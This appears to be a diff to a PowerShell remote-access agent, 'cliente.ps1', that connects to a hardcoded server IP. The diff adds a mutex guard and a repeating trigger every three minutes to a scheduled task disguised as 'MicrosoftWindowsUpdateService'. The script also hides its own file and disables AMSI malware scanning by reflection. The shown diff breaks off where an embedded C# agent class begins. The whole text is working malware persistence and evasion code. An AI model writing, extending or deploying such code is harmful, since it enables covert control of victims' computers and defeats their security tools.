@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# full agent — install, persistence, AMSI bypass, C# runtime with reconnect fix
+# full agent — install, persistence, AMSI bypass, mutex guard, C# runtime with reconnect fix
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -37,10 +37,15 @@ if ($args -notcontains "-silent") {
 
     try {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
-        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
+        $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
+        $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
+            -RepetitionInterval (New-TimeSpan -Minutes 3) `
+            -RepetitionDuration ([TimeSpan]::FromDays(3650))
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" `
+            -Action $action -Trigger $triggerLogon,$triggerRepeat -Principal $principal `
+            -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
     attrib +h +s +r $scriptPath 2>$null
@@ -52,6 +57,11 @@ if ($args -notcontains "-silent") {
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+
+# single-instance guard — scheduled task fires every 3 min, this exits in 20ms if agent already alive.
+# kernel releases the mutex when the process dies, so the next task fire restarts cleanly.
+$mutex = New-Object System.Threading.Mutex($false, "Local\WinUpdateSvcMutex")
+if (-not $mutex.WaitOne(0)) { exit }
 
 if (-not ("R9KAgent" -as [type])) {
     Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
